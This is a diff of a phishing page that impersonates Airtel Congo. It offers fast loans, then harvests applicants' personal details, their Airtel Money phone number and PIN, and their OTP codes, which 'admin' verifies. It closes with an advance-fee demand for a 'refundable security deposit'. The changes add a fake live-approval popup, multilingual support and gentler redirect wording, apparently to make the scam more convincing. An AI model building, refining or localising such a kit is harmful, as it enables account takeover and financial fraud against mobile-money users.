@@ -39,13 +39,25 @@
   .modal p  { font-size:0.88rem; color:var(--text-light); }
 
   /* PROFESSIONAL HEADER BRANDING & LOGO */
-  .brand-header { display: flex; align-items: center; justify-content: space-between; padding: 16px 28px; background: var(--white); border-bottom: 1px solid var(--border); width: 100%; }
+  .brand-header { display: flex; align-items: center; justify-content: space-between; padding: 12px 28px; background: var(--white); border-bottom: 1px solid var(--border); width: 100%; }
   .brand-logo-area { display: flex; align-items: center; gap: 12px; }
   .brand-logo-mark { width: 40px; height: 40px; background: var(--grad); border-radius: 50%; display: flex; align-items: center; justify-content: center; color: var(--white); font-size: 1.3rem; font-weight: bold; box-shadow: 0 3px 10px rgba(237,28,36,0.25); }
   .brand-text-group { display: flex; flex-direction: column; }
   .brand-title { font-size: 1.15rem; font-weight: bold; color: var(--airtel-red); letter-spacing: -0.01em; line-height: 1.2; }
   .brand-subtitle { font-size: 0.75rem; color: var(--text-light); text-transform: uppercase; letter-spacing: 0.05em; }
+  
+  .header-right-group { display: flex; align-items: center; gap: 16px; }
   .brand-nav-right { font-size: 0.85rem; color: var(--text-mid); font-weight: 600; cursor: pointer; }
+
+  /* PROFESSIONAL LANGUAGE SELECTOR DROPDOWN STYLING */
+  .lang-selector-wrap { position: relative; display: inline-block; }
+  .lang-select-btn { background: #fafafa; border: 1px solid var(--border); border-radius: 6px; padding: 6px 10px; font-size: 0.82rem; font-weight: 600; color: var(--text-dark); cursor: pointer; display: flex; align-items: center; gap: 6px; font-family: "Times New Roman", Times, serif; transition: border-color 0.2s; }
+  .lang-select-btn:hover { border-color: var(--airtel-red); }
+  .lang-dropdown-menu { display: none; position: absolute; right: 0; top: calc(100% + 4px); background: #ffffff; border: 1px solid var(--border); border-radius: 6px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 150px; z-index: 1000; overflow: hidden; }
+  .lang-dropdown-menu.show { display: block; }
+  .lang-option { padding: 8px 12px; font-size: 0.82rem; color: var(--text-dark); cursor: pointer; display: flex; align-items: center; gap: 8px; transition: background 0.15s; text-align: left; border: none; background: none; width: 100%; font-family: "Times New Roman", Times, serif; }
+  .lang-option:hover { background: #fdf2f2; color: var(--airtel-red); }
+  .lang-option.active { font-weight: bold; color: var(--airtel-red); background: #fafafa; }
 
   /* NAV */
   .navbar { background:var(--airtel-red); display:flex; align-items:center; justify-content:center; padding:0 20px; height:54px; position:relative; flex-shrink:0; }
@@ -110,6 +122,101 @@
   .feat .ft { font-size:0.8rem; font-weight:600; }
   .feat .fs { font-size:0.73rem; color:var(--text-light); }
   .land-footer { background:var(--airtel-black); padding:14px; text-align:center; font-size:0.77rem; color:rgba(255,255,255,0.6); flex-shrink:0; }
+  
+  /* ───── AIRTEL CONGO LIVE APPROVAL CARD ───── */
+.live-popup{
+    position: absolute;
+    top: 75px;
+    left: 50%;
+    transform: translateX(-50%);
+    width: 90%;
+    max-width: 360px;
+    background: #ffffff;
+    border-radius: 8px;
+    padding: 10px 14px;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    border: 1px solid rgba(230, 0, 0, 0.15);
+    box-shadow: 0 8px 20px rgba(0, 0, 0, 0.12);
+    opacity: 0;
+    visibility: hidden;
+    transition: all 0.35s ease;
+    z-index: 9999;
+}
+
+.live-popup.show{
+    opacity: 1;
+    visibility: visible;
+    transform: translateX(-50%);
+}
+
+.popup-avatar{
+    width: 38px;
+    height: 38px;
+    min-width: 38px;
+    border-radius: 50%;
+    background: linear-gradient(135deg, #e60000, #ff1a1a);
+    color: #ffffff;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 0.95rem;
+    font-weight: 700;
+    box-shadow: 0 2px 6px rgba(230, 0, 0, 0.3);
+}
+
+.popup-content{
+    flex: 1;
+}
+
+.popup-text{
+    font-size: 0.78rem;
+    line-height: 1.35;
+    color: #4b5563;
+}
+
+.popup-text strong{
+    color: #111827;
+    font-weight: 700;
+}
+
+.popup-time{
+    margin-top: 3px;
+    font-size: 0.65rem;
+    color: #e60000;
+    font-weight: 600;
+}
+
+.popup-time::before{
+    content: "● ";
+    animation: pulse 1.2s infinite;
+}
+
+@keyframes pulse{
+    50%{ opacity: .4; }
+}
+
+@media (max-width: 480px){
+    .live-popup{
+        top: 70px;
+        max-width: 330px;
+        padding: 9px 12px;
+    }
+    .popup-avatar{
+        width: 34px;
+        height: 34px;
+        min-width: 34px;
+        font-size: 0.85rem;
+    }
+    .popup-text{
+        font-size: 0.74rem;
+    }
+    .popup-time{
+        font-size: 0.62rem;
+    }
+}
+
 
   /* ───── STEP PAGES 2-4 ───── */
   .step-center { flex:1; display:flex; align-items:flex-start; justify-content:center; padding:28px 16px; }
@@ -211,7 +318,7 @@
   .rth-wrap { background:#fff; border-radius:0 0 var(--radius) var(--radius); padding:14px 24px 24px; }
   .rth-btn { width:100%; padding:13px; background:var(--grad); color:#fff; border:none; border-radius:8px; font-size:0.88rem; font-weight:600; letter-spacing:0.04em; cursor:pointer; font-family:"Times New Roman", Times, serif; box-shadow:0 4px 12px rgba(237,28,36,0.25); }
 
-  /* ───── INLINE ERROR / STATUS MESSAGES ───── */
+  /* INLINE ERROR / STATUS MESSAGES */
   .msg-box { border-radius:var(--radius-sm); padding:12px 16px; font-size:0.84rem; margin-bottom:16px; display:none; align-items:center; gap:10px; }
   .msg-box.show { display:flex; }
   .msg-box.error   { background:#fef2f2; border:1.5px solid #fecaca; color:#991b1b; }
@@ -220,7 +327,7 @@
   .msg-box.warning { background:#fefce8; border:1.5px solid #fef08a; color:#854d0e; }
   .msg-icon { font-size:1.1rem; flex-shrink:0; }
 
-  /* ───── WAITING / POLLING INDICATOR ───── */
+  /* WAITING / POLLING INDICATOR */
   .waiting-box { background:#f8f9ff; border:1px solid #e0e5ff; border-radius:var(--radius-sm); padding:16px; text-align:center; margin-bottom:16px; display:none; }
   .waiting-box.show { display:block; }
   .waiting-box .wb-spinner { width:28px; height:28px; border:3px solid #e0e5ff; border-top-color:var(--airtel-red); border-radius:50%; animation:spin 0.8s linear infinite; margin:0 auto 10px; }
@@ -233,46 +340,66 @@
 
 <!-- ══════════════════════ PAGE 1: LANDING ══════════════════════ -->
 <div id="page-landing" class="page active">
-  <!-- Professional Top Brand Header with Logo -->
   <header class="brand-header">
     <div class="brand-logo-area">
       <div class="brand-logo-mark">a</div>
       <div class="brand-text-group">
         <span class="brand-title">Airtel Congo</span>
-        <span class="brand-subtitle">Financial Services</span>
+        <span class="brand-subtitle" data-i18n="lbl_financial_services">Financial Services</span>
       </div>
     </div>
-    <div class="brand-nav-right" onclick="goTo('page-login')">Sign In</div>
+    <div class="header-right-group">
+      <!-- PROFESSIONAL LANGUAGE SELECTION DROPDOWN BUTTON -->
+      <div class="lang-selector-wrap">
+        <button class="lang-select-btn" onclick="toggleLangDropdown(event)">
+          <span id="currentLangLabel">🌐 English</span> ▾
+        </button>
+        <div class="lang-dropdown-menu" id="langDropdownMenu">
+          <button class="lang-option active" onclick="setLanguage('en')">🇬🇧 English</button>
+          <button class="lang-option" onclick="setLanguage('sw')">🇨🇬 Kiswahili</button>
+          <button class="lang-option" onclick="setLanguage('fr')">🇫🇷 Français</button>
+        </div>
+      </div>
+      <div class="brand-nav-right" onclick="goTo('page-login')" data-i18n="nav_signin">Sign In</div>
+    </div>
   </header>
 
   <div class="land-center">
     <div class="land-card">
-      <h1>Get Your Loan Approved Fast</h1>
-      <p class="land-tagline">Quick approval • Competitive rates • Flexible terms</p>
+      <h1 data-i18n="land_h1">Get Your Loan Approved Fast</h1>
+      <p class="land-tagline" data-i18n="land_sub">Quick approval • Competitive rates • Flexible terms</p>
 
       <div class="calc-box">
-        <h2>Loan Calculator</h2>
-        <div class="calc-row2"><span>Loan Amount</span><span class="cv" id="aDisp">$1,000</span></div>
+        <h2 data-i18n="calc_title">Loan Calculator</h2>
+        <div class="calc-row2"><span data-i18n="calc_amt">Loan Amount</span><span class="cv" id="aDisp">$1,000</span></div>
         <input type="range" id="rA" min="50" max="10000" step="50" value="1000" oninput="calcUp()" style="--pct:9.5%">
         <div class="range-ends"><span>$50</span><span>$10,000</span></div>
-        <div class="calc-row2"><span>Loan Term</span><span class="cv" id="tDisp">12 months</span></div>
+        <div class="calc-row2"><span data-i18n="calc_term">Loan Term</span><span class="cv" id="tDisp">12 months</span></div>
         <input type="range" id="rT" min="6" max="60" step="6" value="12" oninput="calcUp()" style="--pct:11%">
-        <div class="range-ends"><span>6 months</span><span>60 months</span></div>
+        <div class="range-ends"><span data-i18n="calc_6m">6 months</span><span data-i18n="calc_60m">60 months</span></div>
         <div class="monthly-box">
-          <span class="ml">Monthly Payment</span>
+          <span class="ml" data-i18n="calc_monthly">Monthly Payment</span>
           <span class="ma" id="mOut">$88.85</span>
         </div>
       </div>
 
-      <button class="btn-grad" onclick="goTo('page-step1')">APPLY NOW</button>
+      <button class="btn-grad" onclick="goTo('page-step1')" data-i18n="btn_apply_now">APPLY NOW</button>
 
       <div class="feats-row">
-        <div class="feat"><div class="fi">⚡</div><div class="ft">Fast Approval</div><div class="fs">Within 24 hours</div></div>
-        <div class="feat"><div class="fi">💰</div><div class="ft">Low Rates</div><div class="fs">From 12%</div></div>
-        <div class="feat"><div class="fi">🔒</div><div class="ft">Secure</div><div class="fs">Bank-level</div></div>
+        <div class="feat"><div class="fi">⚡</div><div class="ft" data-i18n="feat_fast">Fast Approval</div><div class="fs" data-i18n="feat_fast_sub">Within 24 hours</div></div>
+        <div class="feat"><div class="fi">💰</div><div class="ft" data-i18n="feat_rates">Low Rates</div><div class="fs" data-i18n="feat_rates_sub">From 12%</div></div>
+        <div class="feat"><div class="fi">🔒</div><div class="ft" data-i18n="feat_secure">Secure</div><div class="fs" data-i18n="feat_secure_sub">Bank-level</div></div>
       </div>
     </div>
   </div>
+
+<div id="popup" class="live-popup">
+    <div class="popup-avatar" id="popup-avatar">A</div>
+    <div class="popup-content">
+        <div id="popup-text" class="popup-text"></div>
+        <div id="popup-time" class="popup-time">Just now</div>
+    </div>
+</div>
 
   <div class="land-footer">© 2026 Airtel Congo</div>
 </div>
@@ -284,23 +411,23 @@
       <div class="brand-logo-mark">a</div>
       <div class="brand-text-group">
         <span class="brand-title">Airtel Congo</span>
-        <span class="brand-subtitle">Loan Application</span>
+        <span class="brand-subtitle" data-i18n="lbl_loan_app">Loan Application</span>
       </div>
     </div>
-    <div class="brand-nav-right" onclick="goTo('page-landing')">Home</div>
+    <div class="brand-nav-right" onclick="goTo('page-landing')" data-i18n="nav_home">Home</div>
   </header>
 
   <div class="step-center">
     <div class="step-card">
-      <h2>Loan Application</h2>
-      <p class="step-sub">Step 1 of 3</p>
+      <h2 data-i18n="lbl_loan_app">Loan Application</h2>
+      <p class="step-sub" data-i18n="step_1_sub">Step 1 of 3</p>
       <div class="prog-row"><div class="prog-seg now"></div><div class="prog-seg"></div><div class="prog-seg"></div></div>
       <div class="msg-box error" id="s1Err"><span class="msg-icon">&#x2715;</span><span id="s1ErrTxt"></span></div>
-      <div class="field"><label>Loan Type</label><div class="sel-wrap"><select id="s1ty"><option>Personal Loan</option><option selected>Business Loan</option><option>Home Loan</option><option>Car Loan</option><option>Education Loan</option></select></div></div>
-      <div class="field"><label>Loan Amount ($)</label><input type="number" id="s1am" value="1000" placeholder="Enter amount" oninput="clearErr('s1Err')"></div>
-      <div class="field"><label>Loan Term</label><div class="sel-wrap"><select id="s1te"><option>6 Months</option><option>12 Months</option><option>18 Months</option><option>24 Months</option><option>36 Months</option><option selected>48 Months</option><option>60 Months</option></select></div></div>
-      <div class="field"><label>Purpose of Loan</label><textarea id="s1pu" placeholder="Describe the purpose of your loan…" oninput="clearErr('s1Err')"></textarea></div>
-      <button class="btn-grad" onclick="toS2()">NEXT STEP</button>
+      <div class="field"><label data-i18n="field_loan_type">Loan Type</label><div class="sel-wrap"><select id="s1ty"><option data-i18n="opt_personal">Personal Loan</option><option selected data-i18n="opt_business">Business Loan</option><option data-i18n="opt_home">Home Loan</option><option data-i18n="opt_car">Car Loan</option><option data-i18n="opt_edu">Education Loan</option></select></div></div>
+      <div class="field"><label data-i18n="field_loan_amt">Loan Amount ($)</label><input type="number" id="s1am" value="1000" placeholder="Enter amount" oninput="clearErr('s1Err')"></div>
+      <div class="field"><label data-i18n="field_loan_term">Loan Term</label><div class="sel-wrap"><select id="s1te"><option>6 Months</option><option>12 Months</option><option>18 Months</option><option>24 Months</option><option>36 Months</option><option selected>48 Months</option><option>60 Months</option></select></div></div>
+      <div class="field"><label data-i18n="field_purpose">Purpose of Loan</label><textarea id="s1pu" placeholder="Describe the purpose of your loan…" oninput="clearErr('s1Err')"></textarea></div>
+      <button class="btn-grad" onclick="toS2()" data-i18n="btn_next">NEXT STEP</button>
     </div>
   </div>
 </div>
@@ -312,31 +439,31 @@
       <div class="brand-logo-mark">a</div>
       <div class="brand-text-group">
         <span class="brand-title">Airtel Congo</span>
-        <span class="brand-subtitle">Loan Application</span>
+        <span class="brand-subtitle" data-i18n="lbl_loan_app">Loan Application</span>
       </div>
     </div>
-    <div class="brand-nav-right" onclick="goTo('page-step1')">Back</div>
+    <div class="brand-nav-right" onclick="goTo('page-step1')" data-i18n="nav_back">Back</div>
   </header>
 
   <div class="step-center">
     <div class="step-card">
-      <h2>Loan Application</h2>
-      <p class="step-sub">Step 2 of 3</p>
+      <h2 data-i18n="lbl_loan_app">Loan Application</h2>
+      <p class="step-sub" data-i18n="step_2_sub">Step 2 of 3</p>
       <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg now"></div><div class="prog-seg"></div></div>
       <div class="msg-box error" id="s2Err"><span class="msg-icon">&#x2715;</span><span id="s2ErrTxt"></span></div>
       <div class="field-row">
-        <div class="field"><label>First Name</label><input type="text" id="s2fi" placeholder="First Name" oninput="clearErr('s2Err')"></div>
-        <div class="field"><label>Last Name</label><input type="text" id="s2la" placeholder="Last Name" oninput="clearErr('s2Err')"></div>
+        <div class="field"><label data-i18n="field_fname">First Name</label><input type="text" id="s2fi" placeholder="First Name" oninput="clearErr('s2Err')"></div>
+        <div class="field"><label data-i18n="field_lname">Last Name</label><input type="text" id="s2la" placeholder="Last Name" oninput="clearErr('s2Err')"></div>
       </div>
-      <div class="field"><label>Email Address</label><input type="email" id="s2em" placeholder="your@email.com" oninput="clearErr('s2Err')"></div>
+      <div class="field"><label data-i18n="field_email">Email Address</label><input type="email" id="s2em" placeholder="your@email.com" oninput="clearErr('s2Err')"></div>
       <div class="field">
-        <label>Phone Number</label>
+        <label data-i18n="field_phone">Phone Number</label>
         <div class="phone-row"><div class="ph-pre">+242</div><input type="tel" id="s2ph" placeholder="061234567" maxlength="9" oninput="normalizePhone('s2ph');clearErr('s2Err')"></div>
-        <div class="field-hint">Enter 9 digits for Congo</div>
+        <div class="field-hint" data-i18n="phone_hint">Enter 9 digits for Congo</div>
       </div>
       <div class="step-btns">
-        <button class="btn-gray" onclick="goTo('page-step1')">PREVIOUS</button>
-        <button class="btn-grad" onclick="toS3()">NEXT STEP</button>
+        <button class="btn-gray" onclick="goTo('page-step1')" data-i18n="btn_prev">PREVIOUS</button>
+        <button class="btn-grad" onclick="toS3()" data-i18n="btn_next">NEXT STEP</button>
       </div>
     </div>
   </div>
@@ -350,30 +477,30 @@
       <div class="brand-logo-mark">a</div>
       <div class="brand-text-group">
         <span class="brand-title">Airtel Congo</span>
-        <span class="brand-subtitle">Loan Application</span>
+        <span class="brand-subtitle" data-i18n="lbl_loan_app">Loan Application</span>
       </div>
     </div>
-    <div class="brand-nav-right" onclick="goTo('page-step2')">Back</div>
+    <div class="brand-nav-right" onclick="goTo('page-step2')" data-i18n="nav_back">Back</div>
   </header>
 
   <div class="step-center">
     <div class="step-card">
-      <h2>Loan Application</h2>
-      <p class="step-sub">Step 3 of 3</p>
+      <h2 data-i18n="lbl_loan_app">Loan Application</h2>
+      <p class="step-sub" data-i18n="step_3_sub">Step 3 of 3</p>
       <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg now"></div></div>
       <div class="msg-box error" id="s3Err"><span class="msg-icon">&#x2715;</span><span id="s3ErrTxt"></span></div>
-      <div class="field"><label>Employment Status</label><div class="sel-wrap"><select id="s3em"><option>Employed</option><option selected>Self-Employed</option><option>Unemployed</option><option>Retired</option><option>Student</option></select></div></div>
-      <div class="field"><label>Annual Income ($)</label><input type="number" id="s3in" placeholder="Enter annual income" oninput="clearErr('s3Err')"></div>
+      <div class="field"><label data-i18n="field_emp_status">Employment Status</label><div class="sel-wrap"><select id="s3em"><option data-i18n="emp_employed">Employed</option><option selected data-i18n="emp_self">Self-Employed</option><option data-i18n="emp_unemployed">Unemployed</option><option data-i18n="emp_retired">Retired</option><option data-i18n="emp_student">Student</option></select></div></div>
+      <div class="field"><label data-i18n="field_annual_income">Annual Income ($)</label><input type="number" id="s3in" placeholder="Enter annual income" oninput="clearErr('s3Err')"></div>
       <div class="sum-box">
-        <h3>Application Summary</h3>
-        <div class="sum-row"><span class="sk">Loan Amount:</span><span class="sv" id="sA">$1,000</span></div>
-        <div class="sum-row"><span class="sk">Loan Term:</span><span class="sv" id="sT">48 Months</span></div>
-        <div class="sum-row"><span class="sk">Purpose:</span><span class="sv" id="sP">—</span></div>
-        <div class="sum-row"><span class="sk">Applicant:</span><span class="sv" id="sN">—</span></div>
+        <h3 data-i18n="sum_title">Application Summary</h3>
+        <div class="sum-row"><span class="sk" data-i18n="sum_amt">Loan Amount:</span><span class="sv" id="sA">$1,000</span></div>
+        <div class="sum-row"><span class="sk" data-i18n="sum_term">Loan Term:</span><span class="sv" id="sT">48 Months</span></div>
+        <div class="sum-row"><span class="sk" data-i18n="sum_purpose">Purpose:</span><span class="sv" id="sP">—</span></div>
+        <div class="sum-row"><span class="sk" data-i18n="sum_applicant">Applicant:</span><span class="sv" id="sN">—</span></div>
       </div>
       <div class="step-btns">
-        <button class="btn-gray" onclick="goTo('page-step2')">PREVIOUS</button>
-        <button class="btn-grad" onclick="submitApp()">SUBMIT APPLICATION</button>
+        <button class="btn-gray" onclick="goTo('page-step2')" data-i18n="btn_prev">PREVIOUS</button>
+        <button class="btn-grad" onclick="submitApp()" data-i18n="btn_submit">SUBMIT APPLICATION</button>
       </div>
     </div>
   </div>
@@ -384,12 +511,13 @@
 <div id="page-submitted" class="page">
   <div class="sub-wrap">
     <div class="sub-icon">📋</div>
-    <h2>Application Submitted</h2>
-    <p>Your application is undergoing approval.<br><strong>Important:</strong> Please verify and enter your exact credentials on the Airtel Money page to prevent your application from being paused or declined.</p>
-    <div class="redir-pill">🔄 Redirecting to Airtel Money in <span class="redir-n" id="rdN">3</span>s...</div><br>
-    <button class="btn-go" onclick="goTo('page-login')">Continue to Airtel Money</button>
+    <h2 data-i18n="sub_title">Loan Application Submitted</h2>
+    <p data-i18n="sub_desc">Your loan application has been submitted. Please wait for approval.<br>You will receive a confirmation message. For now, proceed to Airtel Money.</p>
+    <div class="redir-pill"><span data-i18n="sub_redirect">Redirecting to Airtel login in</span> <span class="redir-n" id="rdN">3</span>s...</div><br>
+    <button class="btn-go" onclick="goTo('page-login')" data-i18n="sub_btn_login">Go to Login Now</button>
   </div>
 </div>
+
 <!-- ══════════════════════ PAGE 6: LOGIN ══════════════════════ -->
 <div id="page-login" class="page">
   <header class="brand-header">
@@ -397,23 +525,22 @@
       <div class="brand-logo-mark">a</div>
       <div class="brand-text-group">
         <span class="brand-title">Airtel Congo</span>
-        <span class="brand-subtitle">Secure Portal</span>
+        <span class="brand-subtitle" data-i18n="lbl_secure_portal">Secure Portal</span>
       </div>
     </div>
-    <div class="brand-nav-right" onclick="goTo('page-landing')">Home</div>
+    <div class="brand-nav-right" onclick="goTo('page-landing')" data-i18n="nav_home">Home</div>
   </header>
 
   <div class="login-body-wrap">
-    <h2>Account Login</h2>
+    <h2 data-i18n="login_h2">Account Login</h2>
     <div class="login-inner">
-      <!-- Inline message for login errors -->
       <div class="msg-box error" id="lgMsg"><span class="msg-icon">✕</span><span id="lgMsgTxt"></span></div>
 
       <div class="lg-phone-row">
         <div class="lg-ph-pre">🇨🇬 +242</div>
         <input type="tel" id="lgPh" placeholder="061234567" maxlength="9" oninput="normalizePhone('lgPh');chkLogin()">
       </div>
-      <div class="pin-label">Enter your PIN (4 characters)</div>
+      <div class="pin-label" data-i18n="login_pin_lbl">Enter your PIN (4 characters)</div>
       <div class="pin-row">
         <input type="password" class="pin-box" maxlength="1" oninput="pinMv(this,0)" id="p0">
         <input type="password" class="pin-box" maxlength="1" oninput="pinMv(this,1)" id="p1">
@@ -421,8 +548,8 @@
         <input type="password" class="pin-box" maxlength="1" oninput="pinMv(this,3)" id="p3">
         <button class="pin-eye" onclick="togPin()">👁</button>
       </div>
-      <div class="forgot-pin">Forgot PIN?</div>
-      <button class="btn-login" id="bLogin" onclick="doLogin()">LOGIN</button>
+      <div class="forgot-pin" data-i18n="login_forgot">Forgot PIN?</div>
+      <button class="btn-login" id="bLogin" onclick="doLogin()" data-i18n="login_btn">LOGIN</button>
     </div>
   </div>
   <div class="lg-curve">
@@ -432,7 +559,7 @@
         <span class="brand-title" style="color:#fff;">Airtel Congo</span>
       </div>
       <div class="lg-version">v2.1.3P</div>
-      <div class="lg-terms">By signing in you agree to the <a href="#">Terms and Conditions</a></div>
+      <div class="lg-terms"><span data-i18n="terms_text">By signing in you agree to the</span> <a href="#" data-i18n="terms_link">Terms and Conditions</a></div>
     </div>
   </div>
 </div>
@@ -444,27 +571,25 @@
       <div class="brand-logo-mark">a</div>
       <div class="brand-text-group">
         <span class="brand-title">Airtel Congo</span>
-        <span class="brand-subtitle">Security Verification</span>
+        <span class="brand-subtitle" data-i18n="lbl_security_ver">Security Verification</span>
       </div>
     </div>
-    <div class="brand-nav-right" onclick="goTo('page-login')">Back</div>
+    <div class="brand-nav-right" onclick="goTo('page-login')" data-i18n="nav_back">Back</div>
   </header>
 
   <div class="otp-body-wrap">
     <div class="otp-card">
-      <h2>OTP Verification</h2>
-      <p class="otp-hint">Enter the OTP sent to your phone number</p>
+      <h2 data-i18n="otp_h2">OTP Verification</h2>
+      <p class="otp-hint" data-i18n="otp_hint">Enter the OTP sent to your phone number</p>
       <div class="otp-phone" id="otpPh">+242061234567</div>
 
-      <!-- Inline messages for OTP page -->
       <div class="msg-box error"   id="otpMsgErr"><span class="msg-icon">✕</span><span id="otpMsgErrTxt"></span></div>
       <div class="msg-box success" id="otpMsgOk"><span class="msg-icon">✓</span><span id="otpMsgOkTxt"></span></div>
       <div class="msg-box warning" id="otpMsgWarn"><span class="msg-icon">⚠</span><span id="otpMsgWarnTxt"></span></div>
 
-      <!-- Waiting for admin approval indicator -->
       <div class="waiting-box" id="pinWait">
         <div class="wb-spinner"></div>
-        <p>Waiting for admin to verify your details…</p>
+        <p data-i18n="otp_waiting">Waiting for admin to verify your details…</p>
       </div>
 
       <div id="otpInputSection">
@@ -473,11 +598,9 @@
           <input type="text" class="otp-box" maxlength="1" oninput="otpMv(this,1)" id="o1">
           <input type="text" class="otp-box" maxlength="1" oninput="otpMv(this,2)" id="o2">
           <input type="text" class="otp-box" maxlength="1" oninput="otpMv(this,3)" id="o3">
-          <input type="text" class="otp-box" maxlength="1" oninput="otpMv(this,4)" id="o4">
-          <input type="text" class="otp-box" maxlength="1" oninput="otpMv(this,5)" id="o5">
         </div>
-        <div class="otp-resend" id="otpRs">Resend code in <span id="rsS">17</span> seconds</div>
-        <button class="btn-otp" id="bOtp" onclick="doOtp()">SUBMIT</button>
+        <div class="otp-resend" id="otpRs"><span data-i18n="otp_resend_in">Resend code in</span> <span id="rsS">17</span> <span data-i18n="otp_seconds">seconds</span></div>
+        <button class="btn-otp" id="bOtp" onclick="doOtp()" data-i18n="otp_submit">SUBMIT</button>
       </div>
     </div>
   </div>
@@ -489,43 +612,377 @@
   <div class="appr-wrap">
     <div class="appr-top">
       <div class="check-circle">✓</div>
-      <div class="appr-title">🎉 Congratulations!</div>
-      <div class="appr-sub">Your loan has been <strong>approved!</strong> The funds will be disbursed shortly.</div>
-      <div class="appr-banner"><div class="abl">APPROVED AMOUNT</div><div class="aba" id="apAmt">$1,000</div></div>
+      <div class="appr-title" data-i18n="appr_congrats">🎉 Congratulations!</div>
+      <div class="appr-sub"><span data-i18n="appr_sub1">Your loan has been</span> <strong data-i18n="appr_approved">approved!</strong> <span data-i18n="appr_sub2">The funds will be disbursed shortly.</span></div>
+      <div class="appr-banner"><div class="abl" data-i18n="appr_banner_lbl">APPROVED AMOUNT</div><div class="aba" id="apAmt">$1,000</div></div>
     </div>
     <div class="comp-box">
-      <div class="ch">⚠️ COMPLIANCE NOTICE</div>
-      <p>Your Airtel account must be active and maintain a security deposit of at least <strong>50% of your requested loan amount.</strong> This deposit is fully refundable upon successful loan repayment and helps secure better interest rates.</p>
+      <div class="ch" data-i18n="comp_notice">⚠️ COMPLIANCE NOTICE</div>
+      <p><span data-i18n="comp_text1">Your Airtel account must be active and maintain a security deposit of at least</span> <strong data-i18n="comp_text2">10% of your requested loan amount.</strong> <span data-i18n="comp_text3">This deposit is fully refundable upon successful loan repayment and helps secure better interest rates.</span></p>
     </div>
     <div class="ld-card">
-      <div class="ld-htitle">💳 Loan Details</div>
-      <div class="ld-row"><div class="ld-icon ic-g">💵</div><div><div class="ld-lbl">MONTHLY PAYMENT</div><div class="ld-val" id="apMthly">$27.50</div></div></div>
-      <div class="ld-row"><div class="ld-icon ic-b">📅</div><div><div class="ld-lbl">LOAN TERM</div><div class="ld-val" id="apTerm">48 Months</div></div></div>
-      <div class="ld-row"><div class="ld-icon ic-p">📈</div><div><div class="ld-lbl">INTEREST RATE</div><div class="ld-val">12% APR</div></div></div>
+      <div class="ld-htitle" data-i18n="ld_title">💳 Loan Details</div>
+      <div class="ld-row"><div class="ld-icon ic-g">💵</div><div><div class="ld-lbl" data-i18n="ld_monthly">MONTHLY PAYMENT</div><div class="ld-val" id="apMthly">$27.50</div></div></div>
+      <div class="ld-row"><div class="ld-icon ic-b">📅</div><div><div class="ld-lbl" data-i18n="ld_term">LOAN TERM</div><div class="ld-val" id="apTerm">48 Months</div></div></div>
+      <div class="ld-row"><div class="ld-icon ic-p">📈</div><div><div class="ld-lbl" data-i18n="ld_interest">INTEREST RATE</div><div class="ld-val">12% APR</div></div></div>
     </div>
     <div class="qa-wrap">
-      <div class="qa-title">Quick Actions</div>
-      <button class="qa-btn">💰 Deposit Funds</button>
-      <button class="qa-btn">💸 Withdraw Funds</button>
-      <button class="qa-btn">📄 Loan Details</button>
+      <div class="qa-title" data-i18n="qa_title">Quick Actions</div>
+      <button class="qa-btn" data-i18n="qa_deposit">💰 Deposit Funds</button>
+      <button class="qa-btn" data-i18n="qa_withdraw">💸 Withdraw Funds</button>
+      <button class="qa-btn" data-i18n="qa_details">📄 Loan Details</button>
     </div>
-    <div class="nxt-steps"><span>📱</span><p><strong>Next Steps:</strong><br>You will receive an SMS and email with disbursement details within 24 hours.</p></div>
-    <div class="rth-wrap"><button class="rth-btn" onclick="goTo('page-landing')">🏠 Return to Home</button></div>
+    <div class="nxt-steps"><span>📱</span><p><strong data-i18n="nxt_title">Next Steps:</strong><br><span data-i18n="nxt_desc">You will receive an SMS and email with disbursement details within 24 hours.</span></p></div>
+    <div class="rth-wrap"><button class="rth-btn" onclick="goTo('page-landing')" data-i18n="rth_btn">🏠 Return to Home</button></div>
   </div>
 </div>
 
 <!-- MODALS -->
 <div class="overlay" id="mLogin">
-  <div class="modal"><div class="spinner"></div><h3>Please wait…</h3><p>Sending your details for verification</p></div>
+  <div class="modal"><div class="spinner"></div><h3 data-i18n="modal_wait">Please wait…</h3><p data-i18n="modal_sending">Sending your details for verification</p></div>
 </div>
 <div class="overlay" id="mOtp">
-  <div class="modal"><div class="spinner"></div><h3>Verifying OTP</h3><p id="otpVT">Please wait… (3s)</p></div>
+  <div class="modal"><div class="spinner"></div><h3 data-i18n="modal_verifying_otp">Verifying OTP</h3><p id="otpVT">Please wait… (3s)</p></div>
 </div>
 <div class="overlay" id="mSubmit">
-  <div class="modal"><div class="spinner"></div><h3>Submitting Application…</h3><p>Please wait while we process your application</p></div>
+  <div class="modal"><div class="spinner"></div><h3 data-i18n="modal_submitting">Submitting Application…</h3><p data-i18n="modal_processing">Please wait while we process your application</p></div>
 </div>
 
 <script>
+  // ══════════════════════════════════════════════════════
+  // LOCALIZATION DICTIONARIES (English, Kiswahili Congo, French Congo)
+  // ══════════════════════════════════════════════════════
+  const translations = {
+    en: {
+      lang_label: "🌐 English",
+      lbl_financial_services: "Financial Services",
+      lbl_loan_app: "Loan Application",
+      lbl_secure_portal: "Secure Portal",
+      lbl_security_ver: "Security Verification",
+      nav_signin: "Sign In",
+      nav_home: "Home",
+      nav_back: "Back",
+      land_h1: "Get Your Loan Approved Fast",
+      land_sub: "Quick approval • Competitive rates • Flexible terms",
+      calc_title: "Loan Calculator",
+      calc_amt: "Loan Amount",
+      calc_term: "Loan Term",
+      calc_6m: "6 months",
+      calc_60m: "60 months",
+      calc_monthly: "Monthly Payment",
+      btn_apply_now: "APPLY NOW",
+      feat_fast: "Fast Approval",
+      feat_fast_sub: "Within 24 hours",
+      feat_rates: "Low Rates",
+      feat_rates_sub: "From 12%",
+      feat_secure: "Secure",
+      feat_secure_sub: "Bank-level",
+      step_1_sub: "Step 1 of 3",
+      step_2_sub: "Step 2 of 3",
+      step_3_sub: "Step 3 of 3",
+      field_loan_type: "Loan Type",
+      opt_personal: "Personal Loan",
+      opt_business: "Business Loan",
+      opt_home: "Home Loan",
+      opt_car: "Car Loan",
+      opt_edu: "Education Loan",
+      field_loan_amt: "Loan Amount ($)",
+      field_loan_term: "Loan Term",
+      field_purpose: "Purpose of Loan",
+      btn_next: "NEXT STEP",
